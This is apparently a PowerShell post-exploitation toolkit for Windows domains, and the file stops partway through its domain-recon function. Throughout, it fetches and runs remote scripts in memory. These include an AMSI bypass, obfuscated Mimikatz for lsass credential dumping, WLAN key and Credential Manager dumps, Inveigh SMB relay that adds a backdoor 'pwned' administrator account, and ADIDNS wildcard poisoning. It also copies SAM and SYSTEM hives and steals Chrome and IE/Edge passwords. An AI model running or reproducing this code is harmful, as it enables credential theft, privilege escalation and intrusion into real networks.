#Zipping Function
Add-Type -AssemblyName System.IO.Compression.FileSystem
function Unzip
{
    param([string]$zipfile, [string]$outpath)

    [System.IO.Compression.ZipFile]::ExtractToDirectory($zipfile, $outpath)
}

function AmsiBypass
{
    <#
        .DESCRIPTION
        Amsi bypass by https://github.com/rasta-mouse/AmsiScanBufferBypass
        License: BSD 3-Clause
    #>
    #Privilege Escalation Phase
    iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/SecureThisShit/Creds/master/obfuscatedps/amsi.ps1')
}

function dependencychecks
{
    <#
        .DESCRIPTION
        Checks for System Role, Powershell Version, Proxy active/not active, Elevated or non elevated Session.
        Creates the Log directories or checks if they are already available.
        Author: @securethisshit
        License: BSD 3-Clause
    #>
    #Privilege Escalation Phase
         [int]$systemRoleID = $(get-wmiObject -Class Win32_ComputerSystem).DomainRole



         $systemRoles = @{
                              0         =    " Standalone Workstation    " ;
                              1         =    " Member Workstation        " ;
                              2         =    " Standalone Server         " ;
                              3         =    " Member Server             " ;
                              4         =    " Backup  Domain Controller " ;
                              5         =    " Primary Domain Controller "       
         }

        #Proxy Detect #1
        proxydetect
        pathcheck
        $PSVersion=$PSVersionTable.PSVersion.Major
        
        write-host "[?] Checking for Default PowerShell version ..`n" -ForegroundColor black -BackgroundColor white  ; sleep 1
        
        if($PSVersion -lt 2){
           
                Write-Warning  "[!] You have PowerShell v1.0.`n"
            
                Write-Warning  "[!] This script only supports Powershell verion 2 or above.`n"
            
                read-host "Type any key to continue .."
            
                exit  
        }
        
        write-host "       [+] ----->  PowerShell v$PSVersion`n" ; sleep 1
        
        write-host "[?] Detecting system role ..`n" -ForegroundColor black -BackgroundColor white ; sleep 1
        
        $systemRoleID = $(get-wmiObject -Class Win32_ComputerSystem).DomainRole
        
        if($systemRoleID -ne 1){
        
                "       [-] This script needs access to the domain. It can only be run on a domain member machine.`n"
               
                Read-Host "Type any key to continue .."
                   
        }
        
        write-host "       [+] ----->",$systemRoles[[int]$systemRoleID],"`n" ; sleep 1
}

function pathCheck
{
<#
        .DESCRIPTION
        Checks for correct path dependencies.
        Author: @securethisshit
        License: BSD 3-Clause
    #>
    #Dependency Check
        $currentPath = (Get-Item -Path ".\" -Verbose).FullName                
        Write-Host -ForegroundColor Yellow 'Creating/Checking Log Folders in '$currentPath' directory:'
        
        if (Test-Path $currentPath\LocalRecon\)
        {
            
        }
        else {mkdir $currentPath\LocalRecon\}
        
        if (Test-Path $currentPath\DomainRecon\)
        {
            
        }
        else {mkdir $currentPath\DomainRecon\;mkdir $currentPath\DomainRecon\ADrecon}
        
        if (Test-Path $currentPath\LocalPrivEsc\)
        {
            
        }
        else {mkdir $currentPath\LocalPrivEsc\}
        
        if (Test-Path $currentPath\Exploitation\)
        {
            
        }
        else {mkdir $currentPath\Exploitation\}

}


function isadmin
{
    # Check if Elevated
    $isAdmin = ([System.Security.Principal.WindowsPrincipal][System.Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([System.Security.Principal.WindowsBuiltInRole]::Administrator)
    return $isAdmin
}

function Inveigh {
<#
    .DESCRIPTION
        Starts Inveigh in a parallel window.
        Author: @securethisshit
        License: BSD 3-Clause
    #>
    pathcheck
    
    $relayattacks = Read-Host -Prompt 'Do you want to execute SMB-Relay attacks? (yes/no)'
    if ($relayattacks -eq "yes" -or $relayattacks -eq "y" -or $relayattacks -eq "Yes" -or $relayattacks -eq "Y")
    {
        invoke-expression 'cmd /c start powershell -Command {$Wcl = new-object System.Net.WebClient;$Wcl.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials;IEX(New-Object Net.WebClient).DownloadString(''https://raw.githubusercontent.com/SecureThisShit/WinPwn/master/WinPwn_v0.7.ps1'');WinPwn;}'
        $target = Read-Host -Prompt 'Please Enter an IP-Adress as target for the relay attacks'
        $admingroup = Read-Host -Prompt 'Please Enter the name of your local administrators group: (varies for different countries)'
        $Wcl = new-object System.Net.WebClient
        $Wcl.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials

        IEX(New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/SecureThisShit/Creds/master/Inveigh-Relay.ps1")
        IEX(New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/SecureThisShit/Creds/master/Invoke-SMBClient.ps1")
        IEX(New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/SecureThisShit/Creds/master/Invoke-SMBEnum.ps1")
        IEX(New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/SecureThisShit/Creds/master/Invoke-SMBExec.ps1")

        Invoke-InveighRelay -ConsoleOutput Y -StatusOutput N -Target $target -Command "net user pwned 0WnedAccount! /add; net localgroup $admingroup pwned /add" -Attack Enumerate,Execute,Session

        Write-Host 'You can now check your sessions with Get-Inveigh -Session and use Invoke-SMBClient, Invoke-SMBEnum and Invoke-SMBExec for further recon/exploitation'
    }
    
    $adidns = Read-Host -Prompt 'Do you want to start Inveigh with Active Directory-Integrated DNS dynamic Update attack? (yes/no)'
    if ($adidns -eq "yes" -or $adidns -eq "y" -or $adidns -eq "Yes" -or $adidns -eq "Y")
    {   
        if (isadmin)
        {
                cmd /c start powershell -Command {$Wcl = new-object System.Net.WebClient;$Wcl.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials;IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/SecureThisShit/Creds/master/Inveigh.ps1');Invoke-Inveigh -ConsoleOutput Y -NBNS Y -mDNS Y -HTTPS Y -Proxy Y -ADIDNS Combo -ADIDNSThreshold 2 -FileOutput Y -FileOutputDirectory $currentPath\;}
		}
        else 
        {
               cmd /c start powershell -Command {$Wcl = new-object System.Net.WebClient;$Wcl.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials;IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/SecureThisShit/Creds/master/Inveigh.ps1');Invoke-Inveigh -ConsoleOutput Y -NBNS Y -ADIDNS Combo -ADIDNSThreshold 2 -FileOutput Y -FileOutputDirectory $currentPath\;}
	    }
    }
    else
    {
        if (isadmin)
        {
                cmd /c start powershell -Command {$Wcl = new-object System.Net.WebClient;$Wcl.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials;IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/SecureThisShit/Creds/master/Inveigh.ps1');Invoke-Inveigh -ConsoleOutput Y -NBNS Y -mDNS Y -HTTPS Y -Proxy Y -FileOutput Y -FileOutputDirectory $currentPath\;}
		
        }
        else 
        {
               cmd /c start powershell -Command {$Wcl = new-object System.Net.WebClient;$Wcl.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials;IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/SecureThisShit/Creds/master/Inveigh.ps1');Invoke-Inveigh -ConsoleOutput Y -NBNS Y -FileOutput Y -FileOutputDirectory $currentPath\;}
	       
        }
    }
}


function adidnswildcard
{
    <#
    .DESCRIPTION
        Starts Inveigh in a parallel window.
        Author: @securethisshit
        License: BSD 3-Clause
    #>
    pathcheck
    $adidns = Read-Host -Prompt 'Are you REALLY sure, that you want to create a Active Directory-Integrated DNS Wildcard record? This can in the worst case cause network disruptions for all clients and servers for the next hours! (yes/no)'
    if ($adidns -eq "yes" -or $adidns -eq "y" -or $adidns -eq "Yes" -or $adidns -eq "Y")
    {
        IEX(New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/SecureThisShit/Creds/master/Powermad.ps1")
        New-ADIDNSNode -Node * -Tombstone -Verbose
        Write-Host -ForegroundColor Red 'Be sure to remove the record with `Disable-ADIDNSNode -Node * -Verbose` at the end of your tests'
        Write-Host -ForegroundColor Yellow 'Starting Inveigh to capture all theese mass hashes:'
        Inveigh
    }
           
}

function sessionGopher 
{
    <#
    .DESCRIPTION
        Starts SessionGopher to search for Cached Credentials.
        Author: @securethisshit
        License: BSD 3-Clause
    #>
    pathcheck
    $currentPath = (Get-Item -Path ".\" -Verbose).FullName
    IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/SecureThisShit/Creds/master/obfuscatedps/segoph.ps1')
    $whole_domain = Read-Host -Prompt 'Do you want to start SessionGopher search over the whole domain? (yes/no) - takes a lot of time'
    if ($whole_domain -eq "yes" -or $whole_domain -eq "y" -or $whole_domain -eq "Yes" -or $whole_domain -eq "Y")
    {
            $session = Read-Host -Prompt 'Do you want to start SessionGopher with thorough tests? (yes/no) - takes a fuckin lot of time'
            if ($session -eq "yes" -or $session -eq "y" -or $session -eq "Yes" -or $session -eq "Y")
            {
                Write-Host -ForegroundColor Yellow 'Starting Local SessionGopher, output is generated in '$currentPath'\LocalRecon\SessionGopher.txt:'
                cachet -hdPXEKUQjxCYg9C -qMELeoMyJPUTJQY >> $currentPath\LocalRecon\SessionGopher.txt -Outfile
            }
            else 
            {
                Write-Host -ForegroundColor Yellow 'Starting SessionGopher without thorough tests, output is generated in '$currentPath'\LocalRecon\SessionGopher.txt:'
                cachet -qMELeoMyJPUTJQY >> $currentPath\LocalRecon\SessionGopher.txt
            }
    }
    else
    {
        $session = Read-Host -Prompt 'Do you want to start SessionGopher with thorough tests? (yes/no) - takes a lot of time'
            if ($session -eq "yes" -or $session -eq "y" -or $session -eq "Yes" -or $session -eq "Y")
            {
                Write-Host -ForegroundColor Yellow 'Starting Local SessionGopher, output is generated in '$currentPath'\LocalRecon\SessionGopher.txt:'
                cachet -hdPXEKUQjxCYg9C >> $currentPath\LocalRecon\SessionGopher.txt -Outfile
            }
            else 
            {
                Write-Host -ForegroundColor Yellow 'Starting SessionGopher without thorough tests,output is generated in '$currentPath'\LocalRecon\SessionGopher.txt:'
                cachet >> $currentPath\LocalRecon\SessionGopher.txt
            }
    }
}


function kittielocal 
{
    <#
    .DESCRIPTION
        Dumps Credentials from Memory / SAM Database.
        Author: @securethisshit
        License: BSD 3-Clause
    #>
    $currentPath = (Get-Item -Path ".\" -Verbose).FullName
    pathcheck
    AmsiBypass
    if (isadmin)
    {
            IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/SecureThisShit/Creds/master/obfuscatedps/mimi.ps1')
            IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/SecureThisShit/Creds/master/Get-WLAN-Keys.ps1')
            iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/SecureThisShit/Creds/master/obfuscatedps/DumpWCM.ps1')

            Write-Host -ForegroundColor Yellow 'Dumping Windows Credential Manager:'
            Invoke-WCMDump >> $currentPath\Exploitation\WCMCredentials.txt
            
            $output_file = Read-Host -Prompt 'Save credentials to a local text file? (yes/no)'
            if ($output_file -eq "yes" -or $output_file -eq "y" -or $output_file -eq "Yes" -or $output_file -eq "Y")
            {
                Write-Host -ForegroundColor Yellow 'Dumping Credentials from lsass.exe:'
                Invoke-Mimikatz >> $currentPath\Exploitation\Credentials.txt
                Get-WLAN-Keys >> $currentPath\Exploitation\WIFI_Keys.txt
            }
            else
            {
            Invoke-Mimikatz
            Get-WLAN-Keys
            }
    }
    else
    {
        Write-Host -ForegroundColor Yellow 'You need local admin rights for this, only dumping Credential Manager now!'
        iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/SecureThisShit/Creds/master/obfuscatedps/DumpWCM.ps1')
        Write-Host -ForegroundColor Yellow 'Dumping Windows Credential Manager:'
        Invoke-WCMDump >> $currentPath\Exploitation\WCMCredentials.txt
    }

}


function localreconmodules
{
<#
        .DESCRIPTION
        All local recon scripts are executed here.
        Author: @securethisshit
        License: BSD 3-Clause
    #>
    #Local Reconning
            pathcheck
            $currentPath = (Get-Item -Path ".\" -Verbose).FullName
            IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/SecureThisShit/Creds/master/Get-ComputerDetails.ps1')
            IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/SecureThisShit/Creds/master/obfuscatedps/view.ps1')

            Write-Host -ForegroundColor Yellow 'Starting local Recon phase:'
            
            Write-Host -ForegroundColor Yellow 'Parsing Event logs for sensitive Information:'
            [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
            Invoke-WebRequest -Uri 'https://github.com/SecureThisShit/Creds/raw/master/Ghostpack/EventLogParser.exe' -Outfile "$currentPath\EventLogParser.exe"
            .\EventLogParser.exe eventid=4103 outfile="$currentPath\LocalRecon\EventlogSensitiveInformations.txt"
            .\EventLogParser.exe eventid=4104 outfile="$currentPath\LocalRecon\EventlogSensitiveInformations.txt"
            if (isadmin){EventLogParser.exe eventid=4688 outfile="$currentPath\LocalRecon\EventlogSensitiveInformations.txt"}


            #Check for WSUS Updates over HTTP
	        Write-Host -ForegroundColor Yellow 'Checking for WSUS over http'
            $UseWUServer = (Get-ItemProperty "HKLM:\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate\AU" -Name UseWUServer -ErrorAction SilentlyContinue).UseWUServer
            $WUServer = (Get-ItemProperty "HKLM:\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate" -Name WUServer -ErrorAction SilentlyContinue).WUServer

            if($UseWUServer -eq 1 -and $WUServer.ToLower().StartsWith("http://")) 
	        {
        	    Write-Host -ForegroundColor Yellow 'WSUS Server over HTTP detected, most likely all hosts in this domain can get fake-Updates!'
		        echo "Wsus over http detected! Fake Updates can be delivered here. $UseWUServer / $WUServer " >> "$currentPath\LocalRecon\WsusoverHTTP.txt"
            }

            #Check for SMB Signing
            Write-Host -ForegroundColor Yellow 'Check SMB-Signing for the local system'
            iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/SecureThisShit/Creds/master/Invoke-SMBNegotiate.ps1')
            Invoke-SMBNegotiate -ComputerName localhost >> "$currentPath\LocalRecon\SMBSigningState.txt"

            #Collecting Informations
            Write-Host -ForegroundColor Yellow 'Collecting local system Informations for later lookup, saving them to .\LocalRecon\'
            systeminfo >> "$currentPath\LocalRecon\systeminfo.txt"
            wmic qfe >> "$currentPath\LocalRecon\Patches.txt"
            wmic os get osarchitecture >> "$currentPath\LocalRecon\Architecture.txt"
            Get-ChildItem Env: | ft Key,Value >> "$currentPath\LocalRecon\Environmentvariables.txt"
            Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root >> "$currentPath\LocalRecon\Drives.txt"
            whoami /priv >> "$currentPath\LocalRecon\Privileges.txt"
            Get-LocalUser | ft Name,Enabled,LastLogon >> "$currentPath\LocalRecon\LocalUsers.txt"
            net accounts >>  "$currentPath\LocalRecon\PasswordPolicy.txt"
            Get-LocalGroup | ft Name >> "$currentPath\LocalRecon\LocalGroups.txt"
            Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address >> "$currentPath\LocalRecon\Networkinterfaces.txt"
            Get-DnsClientServerAddress -AddressFamily IPv4 | ft >> "$currentPath\LocalRecon\DNSServers.txt"
            Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex >> "$currentPath\LocalRecon\NetRoutes.txt"
            Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,LinkLayerAddress,State >> "$currentPath\LocalRecon\ArpTable.txt"
            netstat -ano >> "$currentPath\LocalRecon\ActiveConnections.txt"
            net share >> "$currentPath\LocalRecon\Networkshares.txt"
	    Get-Installedsoftware -Property DisplayVersion,InstallDate >> "$currentPath\LocalRecon\InstalledSoftwareAll.txt"
            
	    iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/SecureThisShit/Creds/master/Invoke-Vulmap.ps1')
	    Invoke-Vulmap >> "$currentPath\LocalRecon\VulnerableSoftware.txt"
            
            $passhunt = Read-Host -Prompt 'Do you want to search for Passwords on this system using passhunt.exe? (Its worth it) (yes/no)'
            if ($passhunt -eq "yes" -or $passhunt -eq "y" -or $passhunt -eq "Yes" -or $passhunt -eq "Y")
            {
                passhunt -local $true
            }
            
            # Collecting more information
            Write-Host -ForegroundColor Yellow 'Checking for accesible SAM/SYS Files'
            If (Test-Path -Path 'Registry::HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\SNMP'){Get-ChildItem -path 'Registry::HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\SNMP' -Recurse >> "$currentPath\LocalRecon\SNMP.txt"}            
            If (Test-Path -Path %SYSTEMROOT%\repair\SAM){Write-Host -ForegroundColor Yellow "SAM File reachable, looking for SYS?";copy %SYSTEMROOT%\repair\SAM "$currentPath\LocalRecon\SAM"}
            If (Test-Path -Path %SYSTEMROOT%\System32\config\SAM){Write-Host -ForegroundColor Yellow "SAM File reachable, looking for SYS?";copy %SYSTEMROOT%\System32\config\SAM "$currentPath\LocalRecon\SAM"}
            If (Test-Path -Path %SYSTEMROOT%\System32\config\RegBack\SAM){Write-Host -ForegroundColor Yellow "SAM File reachable, looking for SYS?";copy %SYSTEMROOT%\System32\config\RegBack\SAM "$currentPath\LocalRecon\SAM"}
            If (Test-Path -Path %SYSTEMROOT%\System32\config\SAM){Write-Host -ForegroundColor Yellow "SAM File reachable, looking for SYS?";copy %SYSTEMROOT%\System32\config\SAM "$currentPath\LocalRecon\SAM"}
            If (Test-Path -Path %SYSTEMROOT%\repair\system){Write-Host -ForegroundColor Yellow "SYS File reachable, looking for SAM?";copy %SYSTEMROOT%\repair\system "$currentPath\LocalRecon\SYS"}
            If (Test-Path -Path %SYSTEMROOT%\System32\config\SYSTEM){Write-Host -ForegroundColor Yellow "SYS File reachable, looking for SAM?";copy %SYSTEMROOT%\System32\config\SYSTEM "$currentPath\LocalRecon\SYS"}
            If (Test-Path -Path %SYSTEMROOT%\System32\config\RegBack\system){Write-Host -ForegroundColor Yellow "SYS File reachable, looking for SAM?";copy %SYSTEMROOT%\System32\config\RegBack\system "$currentPath\LocalRecon\SYS"}

            Write-Host -ForegroundColor Yellow 'Checking Registry for potential passwords'
            REG QUERY HKLM /F "passwor" /t REG_SZ /S /K >> "$currentPath\LocalRecon\PotentialHKLMRegistryPasswords.txt"
            REG QUERY HKCU /F "password" /t REG_SZ /S /K >> "$currentPath\LocalRecon\PotentialHKCURegistryPasswords.txt"

            Write-Host -ForegroundColor Yellow 'Checking sensitive registry entries..'
            If (Test-Path -Path 'Registry::HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon')
	        {
	    	    reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" >> "$currentPath\LocalRecon\Winlogon.txt"
	        }
            If (Test-Path -Path 'Registry::HKEY_LOCAL_MACHINE\SYSTEM\Current\ControlSet\Services\SNMP'){reg query "HKLM\SYSTEM\Current\ControlSet\Services\SNMP" >> "$currentPath\LocalRecon\SNMPParameters.txt"}
            If (Test-Path -Path 'Registry::HKEY_LOCAL_MACHINE\SOFTWARE\Software\SimonTatham\PuTTY\Sessions'){reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" >> "$currentPath\LocalRecon\PuttySessions.txt"}
            If (Test-Path -Path 'Registry::HKEY_CURRENT_USER\Software\ORL\WinVNC3\Password'){reg query "HKCU\Software\ORL\WinVNC3\Password" >> "$currentPath\LocalRecon\VNCPassword.txt"}
            If (Test-Path -Path 'Registry::HKEY_LOCAL_MACHINE\SOFTWARE\RealVNC\WinVNC4'){reg query HKEY_LOCAL_MACHINE\SOFTWARE\RealVNC\WinVNC4 /v password >> "$currentPath\LocalRecon\RealVNCPassword.txt"}

            If (Test-Path -Path C:\unattend.xml){copy C:\unattend.xml "$currentPath\LocalRecon\unattended.xml"; Write-Host -ForegroundColor Yellow 'Unattended.xml Found, check it for passwords'}
            If (Test-Path -Path C:\Windows\Panther\Unattend.xml){copy C:\Windows\Panther\Unattend.xml "$currentPath\LocalRecon\unattended.xml"; Write-Host -ForegroundColor Yellow 'Unattended.xml Found, check it for passwords'}
            If (Test-Path -Path C:\Windows\Panther\Unattend\Unattend.xml){copy C:\Windows\Panther\Unattend\Unattend.xml "$currentPath\LocalRecon\unattended.xml"; Write-Host -ForegroundColor Yellow 'Unattended.xml Found, check it for passwords'}
            If (Test-Path -Path C:\Windows\system32\sysprep.inf){copy C:\Windows\system32\sysprep.inf "$currentPath\LocalRecon\sysprep.inf"; Write-Host -ForegroundColor Yellow 'Sysprep.inf Found, check it for passwords'}
            If (Test-Path -Path C:\Windows\system32\sysprep\sysprep.xml){copy C:\Windows\system32\sysprep\sysprep.xml "$currentPath\LocalRecon\sysprep.inf"; Write-Host -ForegroundColor Yellow 'Sysprep.inf Found, check it for passwords'}

            Get-Childitem -Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue >> "$currentPath\LocalRecon\webconfigfiles.txt"

            Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize >> "$currentPath\LocalRecon\RunningTasks.txt"

            Write-Host -ForegroundColor Yellow 'Checking for usable credentials (cmdkey /list)'
            cmdkey /list >> "$currentPath\LocalRecon\SavedCredentials.txt" # runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"



            $dotnet = Read-Host -Prompt 'Do you want to search for .NET Binaries on this system? (theese can be easily reverse engineered for vulnerability analysis) (yes/no)'
            if ($dotnet -eq "yes" -or $dotnet -eq "y" -or $dotnet -eq "Yes" -or $dotnet -eq "Y")
            {
                Write-Host -ForegroundColor Yellow 'Searching for Files - Output is saved to the localrecon folder:'
                iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/SecureThisShit/Creds/master/Get-DotNetServices.ps1')
                Get-DotNetServices  >> "$currentPath\LocalRecon\DotNetBinaries.txt"
            }

            if (isadmin)
            {
                invoke-expression 'cmd /c start powershell -Command {$Wcl = new-object System.Net.WebClient;$Wcl.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials;IEX(New-Object Net.WebClient).DownloadString(''https://raw.githubusercontent.com/threatexpress/red-team-scripts/master/HostEnum.ps1'');Invoke-HostEnum >> .\LocalRecon\HostEnum.txt}'
                 $PSrecon = Read-Host -Prompt 'Do you want to gather local computer Informations with PSRecon? (yes/no)'
                if ($PSrecon -eq "yes" -or $PSrecon -eq "y" -or $PSrecon -eq "Yes" -or $PSrecon -eq "Y")
                {
                    invoke-expression 'cmd /c start powershell -Command {$Wcl = new-object System.Net.WebClient;$Wcl.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials;Invoke-WebRequest -Uri ''https://raw.githubusercontent.com/gfoss/PSRecon/master/psrecon.ps1'' -Outfile .\LocalRecon\Psrecon.ps1;Write-Host -ForegroundColor Yellow ''Starting PsRecon:'';.\LocalRecon\Psrecon.ps1;pause}'
                }
                Write-Host -ForegroundColor Yellow 'Saving general computer information to .\LocalRecon\Computerdetails.txt:'
                Get-ComputerDetails >> "$currentPath\LocalRecon\Computerdetails.txt"

                Write-Host -ForegroundColor Yellow 'Starting WINSpect:'
            invoke-expression 'cmd /c start powershell -Command {$Wcl = new-object System.Net.WebClient;$Wcl.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials;IEX (New-Object Net.WebClient).DownloadString(''https://raw.githubusercontent.com/A-mIn3/WINspect/master/WINspect.ps1'');}'
            }

         
            $session = Read-Host -Prompt 'Do you want to start SessionGopher module? (yes/no)'
            if ($session -eq "yes" -or $session -eq "y" -or $session -eq "Yes" -or $session -eq "Y")
            {
                sessionGopher
            }

            $search = Read-Host -Prompt 'Do you want to search for sensitive files on this local system? (config files, rdp files, password files and more) (yes/no) - takes a lot of time'
            if ($search -eq "yes" -or $search -eq "y" -or $search -eq "Yes" -or $search -eq "Y")
            {
                IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/SecureThisShit/Creds/master/obfuscatedps/find-interesting.ps1')
                Write-Host -ForegroundColor Yellow 'Looking for interesting files:'
                Find-InterestingFile -Path 'C:\' -Outfile "$currentPath\LocalRecon\InterestingFiles.txt"
                Find-InterestingFile -Path 'C:\' -Terms pass,login,rdp,kdbx,backup -Outfile "$currentPath\LocalRecon\MoreFiles.txt"
            }

            $search = Read-Host -Prompt 'Start Just Another Windows (Enum) Script? (yes/no)'
            if ($search -eq "yes" -or $search -eq "y" -or $search -eq "Yes" -or $search -eq "Y")
            {
                jaws
            }
            
            $chrome = Read-Host -Prompt 'Dump Chrome Browser history and maybe passwords? (yes/no)'
            if ($chrome -eq "yes" -or $chrome -eq "y" -or $chrome -eq "Yes" -or $chrome -eq "Y")
            {
                iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/SecureThisShit/Creds/master/Get-ChromeDump.ps1')
                Install-SqlLiteAssembly
                Get-ChromeDump >> "$currentPath\LocalRecon\Chrome_Credentials.txt"
                Get-ChromeHistory >> "$currentPath\LocalRecon\ChromeHistory.txt"
                Write-Host -ForegroundColor Yellow 'Done, look in the localrecon folder for creds/history:'
            }
	    
            $IE = Read-Host -Prompt 'Dump IE / Edge Browser passwords? (yes/no)'
            if ($IE -eq "yes" -or $IE -eq "y" -or $IE -eq "Yes" -or $IE -eq "Y")
            {
	    	[void][Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime]
	    	$vault = New-Object Windows.Security.Credentials.PasswordVault 
	    	$vault.RetrieveAll() | % { $_.RetrievePassword();$_ } >> "$currentPath\LocalRecon\InternetExplorer_Credentials.txt"
	    }
}

function passhunt
{
<#
        .DESCRIPTION
        Search for hashed or cleartext passwords on the local system or on the domain.
        Author: @SecureThisShit
        License: BSD 3-Clause
    #>
    #Local/Domain Recon / Privesc
    Param
    (
        [bool]
        $local,

        [bool]
        $domain
    )
    pathcheck
    $currentPath = (Get-Item -Path ".\" -Verbose).FullName
    IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/SecureThisShit/Creds/master/obfuscatedps/viewdevobfs.ps1')

        if ($domain)
        {
            Write-Host -ForegroundColor Yellow 'Collecting active Windows Servers from the domain...'
            $ActiveServers = Get-DomainComputer -Ping -OperatingSystem "Windows Server*"
            $ActiveServers.dnshostname >> "$currentPath\DomainRecon\activeservers.txt"

            IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/SecureThisShit/Creds/master/obfuscatedps/viewobfs.ps1')
            Write-Host -ForegroundColor Yellow 'Searching for Shares on the found Windows Servers...'
            brainstorm -ComputerFile "$currentPath\DomainRecon\activeservers.txt" -NoPing -CheckShareAccess | Out-File -Encoding ascii "$currentPath\DomainRecon\found_shares.txt"
             
            $shares = Get-Content "$currentPath\DomainRecon\found_shares.txt"
            $testShares = foreach ($line in $shares){ echo ($line).Split(' ')[0]}

            Write-Host -ForegroundColor Yellow 'Starting Passhunt.exe for all found shares.'
            if (test-path $currentPath\passhunt.exe)
            {
                foreach ($line in $testShares)
                {
                    cmd /c start powershell -Command "$currentPath\passhunt.exe -s $line"
                }
            }
            else
            {
                [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
                Invoke-WebRequest -Uri 'https://github.com/SecureThisShit/Creds/raw/master/passhunt.exe' -Outfile $currentPath\passhunt.exe
                foreach ($line in $shares)
                {
                    cmd /c start powershell -Command "$currentPath\passhunt.exe -s $line"
                } 
                                    
            }
        }
        if ($local)
        {
            [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
            Invoke-WebRequest -Uri 'https://github.com/SecureThisShit/Creds/raw/master/passhunt.exe' -Outfile $currentPath\passhunt.exe
            
            cmd /c start powershell -Command "$currentPath\passhunt.exe"
            $sharepasshunt = Read-Host -Prompt 'Do you also want to search for Passwords on all connected networkshares?'
            if ($sharepasshunt -eq "yes" -or $sharepasshunt -eq "y" -or $sharepasshunt -eq "Yes" -or $sharepasshunt -eq "Y")
            {
                get-WmiObject -class Win32_Share | ft Path >> passhuntshares.txt
                $shares = get-content .\passhuntshares.txt | select-object -skip 4    
                foreach ($line in $shares)
                {
                    cmd /c start powershell -Command "$currentPath\passhunt.exe -s $line"
                } 
                                  
            }
        }
        else
        {
            [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
            Invoke-WebRequest -Uri 'https://github.com/SecureThisShit/Creds/raw/master/passhunt.exe' -Outfile $currentPath\passhunt.exe
            cmd /c start powershell -Command "$currentPath\passhunt.exe"
        }

}

function jaws
{
<#
        .DESCRIPTION
        Just another Windows Enumeration Script.
        Author: @411Hall
        License: BSD 3-Clause
    #>
            #Local Recon / Privesc
            pathcheck
            $currentPath = (Get-Item -Path ".\" -Verbose).FullName
            Write-Host -ForegroundColor Yellow 'Executing Just Another Windows (Enum) Script:'
            Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/SecureThisShit/Creds/master/jaws-enum.ps1' -Outfile "$currentPath\LocalPrivesc\JAWS.ps1"
            Invoke-expression 'cmd /c start powershell -Command {powershell.exe -ExecutionPolicy Bypass -File .\LocalPrivesc\JAWS.ps1 -OutputFilename JAWS-Enum.txt}'

}

function domainreconmodules
{
<#
        .DESCRIPTION
        All domain recon scripts are executed here.
        Author: @securethisshit
        License: BSD 3-Clause
    #>
            #Domain / Network Reconing
            $currentPath = (Get-Item -Path ".\" -Verbose).FullName
            pathcheck
            IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/SecureThisShit/Creds/master/DomainPasswordSpray.ps1')
            IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/SecureThisShit/Creds/master/obfuscatedps/view.ps1')
            $domain_Name = skulked
            $Domain = $domain_Name.Name

            Write-Host -ForegroundColor Yellow 'Starting Domain Recon phase:'

